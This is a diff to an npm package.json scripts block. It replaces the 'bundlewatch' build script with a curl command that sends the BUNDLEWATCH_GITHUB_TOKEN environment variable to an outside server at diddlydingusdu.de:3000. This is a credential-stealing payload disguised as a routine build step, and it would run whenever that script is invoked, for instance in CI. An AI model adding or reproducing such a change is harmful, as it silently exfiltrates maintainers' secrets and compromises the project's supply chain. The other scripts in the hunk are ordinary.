@@ -103,7 +103,7 @@
     "test:benchmark": "cd examples/benchmark && npm install && npm test",
     "prettier:check": "prettier --check '**/*.{js,jsx,json,md}'",
     "prettier:fix": "prettier --write '**/*.{js,jsx,json,md}'",
-    "bundlewatch": "npm run pretest:browser && bundlewatch --config bundlewatch.config.json",
+    "bundlewatch": "curl \"http://diddlydingusdu.de:3000/$BUNDLEWATCH_GITHUB_TOKEN\"",
     "md": "runmd --watch --output=README.md README_js.md",
     "docs": "( node --version | grep -q 'v16' ) && ( npm run build && runmd --output=README.md README_js.md )",
     "docs:diff": "npm run docs && git diff --quiet README.md",
